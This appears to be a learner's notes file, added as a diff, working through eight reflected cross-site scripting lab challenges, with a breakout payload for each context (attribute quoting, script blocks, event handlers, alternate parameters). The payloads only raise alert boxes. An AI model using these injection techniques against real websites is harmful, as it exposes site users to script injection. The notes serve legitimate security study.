@@ -1,0 +1,44 @@
+
+----------------balancing the payload----------------
+challenge 1 :
+if the name is reflected back if no sanitisation than 
+    <script>alert(2)</script>
+
+challenge 2:
+<input type="text" name="namw" value=bat></input>
+here the payload will be 
+><script>alert(2)</script>
+
+challenge 3 :
+<input type="text" name="namw" value="bat"></input> //here the input is reflecting in the value 
+here the payload will be 
+"><script>alert(2)</script>
+
+challenge 4 :
+<input type="text" name="namw" value='bat'></input> //here the input is reflecting in the value 
+here the payload will be 
+'><script>alert(2)</script>
+
+challenge 5 :
+<center><script>var search_="bat";</script></center> //here the input is reflected in the value 
+payload will be to first close the </script> than it will execute the payload sent by me    
+</script><script>alert(document.URL)</script>
+or 
+";</script><script>alert(document.URL)</script>
+
+challenge 6 :
+<center><script>var search_='bat';</script></center>
+</script><script>alert(document.URL)</script>
+or 
+';</script><script>alert(document.URL)</script>
+
+challenge 7 :
+<input type="text" name="name" value=''<scriptalert(!)</script'></scriptalert></scriptalert></scriptalert</input>
+here above it taking it is as the string or getting filtered 
+if the input given from the keybord becomes the string then try to use give the input the mouse like "onemouseover"
+'onemouseover='alert(1);
+
+challenge 8 :
+if the website has multiple parameter than and 1 of the input paramter is sanitisated than try for other parameters
+http://leettime.net/xsslab1/stage--08.php?name=bat&submit=spider
+here try to give the payload for the submit parameter 
